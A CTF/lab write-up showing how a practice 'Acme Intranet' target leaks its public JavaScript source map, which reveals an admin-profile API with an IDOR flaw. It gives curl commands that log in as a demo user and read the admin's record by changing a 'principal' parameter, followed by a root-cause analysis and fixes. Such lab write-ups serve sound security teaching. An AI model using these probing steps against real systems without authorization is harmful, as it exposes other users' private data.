# Acme Intranet Pwnbox Lab - Source Map + Session-Tied IDOR (2026-07-09)

Date: 2026-07-09
Target type: CTF/lab
Host: `https://5f1d21017a49.pwnbox-lab.com/`
Bug class: Source map disclosure, dormant API discovery, IDOR / broken object-level authorization

## Observation

Same Acme Intranet family as the 2026-07-08 instance, with a different packaging story:

- Challenge text: JS is one minified bundle; id is session-tied
- Login: `demo` / `demo` → `POST /api/login` JSON
- Signed cookies: `session=eyJ1aWQiOjQyfQ==` (`{"uid":42}`) + `session.sig=...`
- Dashboard loads only `/js/app.bundle.js` (no separate `team.js` / `profile.js`)
- Announcement: build migrated to esbuild; sidebar widgets parked pending privacy review; **Mira (#1, admin)**

## Hypothesis

Minifying into one bundle does not remove dormant modules if they are still imported at build time. A public source map would restore original sources and document an alternate id-based admin profile API. That API may lack ownership checks even though `/api/v1/user/me` is session-bound.

## Evidence

### Session-bound primary route

```text
GET /api/v1/user/me
→ { id:42, username:demo, name, email, title }  # no secret
```

Older path `/api/me` returns Express `Cannot GET` on this instance.

### Source map

```text
GET /js/app.bundle.js.map  → 200 application/json
sources include:
  ../../src/userInfo.js
  ../../src/adminInfo.js
  ../../src/notifications.js
  ../../src/audit.js
  ../../src/preferences.js
  ../../src/index.js
```

`adminInfo.js` in `sourcesContent` documents:

```text
GET /api/v1/admin/profile?principal=<numeric user id>
→ { id, username, name, email, title, secret }
```

Notes that missing `principal` returns generic 403.

### IDOR

```text
GET /api/v1/admin/profile?principal=42
→ demo record, secret placeholder

GET /api/v1/admin/profile?principal=1
→ Mira / CTO, secret contains flag
```

## Failed Assumptions

- Looking only for `/api/teamMemberInfo/:id` from the older Acme writeup — this instance renamed the surface to `/api/v1/admin/profile?principal=`
- Expecting separate `/js/team.js` on disk — dormant code lives only inside the map / unused bundle modules

## Working Theory

Developer secured the “me” endpoint and shipped one bundle, but left unused admin-profile client code in the build and published the source map. Server still serves the admin profile lookup without object-level authorization.

## Final Root Cause

Inconsistent authorization: session-derived identity on `/api/v1/user/me`, raw `principal` query param on `/api/v1/admin/profile` with no ownership/role check. Source map made discovery trivial.

## Minimal Reproduction

```bash
curl -sS -c /tmp/cj -X POST 'https://[host]/api/login' \
  -H 'content-type: application/json' \
  -d '{"username":"demo","password":"demo"}'

curl -sS -b /tmp/cj 'https://[host]/js/app.bundle.js.map' | jq -r '.sources[]'

curl -sS -b /tmp/cj 'https://[host]/api/v1/admin/profile?principal=1'
```

## Fix

- Enforce ownership/role on `/api/v1/admin/profile`
- Strip unused modules from production builds
- Disable public source maps in production
- Regression-test all id/principal query routes

## Related

- `writeups/acme-intranet-session-tied-idor.md`
- `notes/session-secured-endpoint-idor-bypass.md`
- `notes/source-maps-and-hidden-endpoints.md`
- `labs/2026-07-08-acme-intranet-session-tied-idor.md`
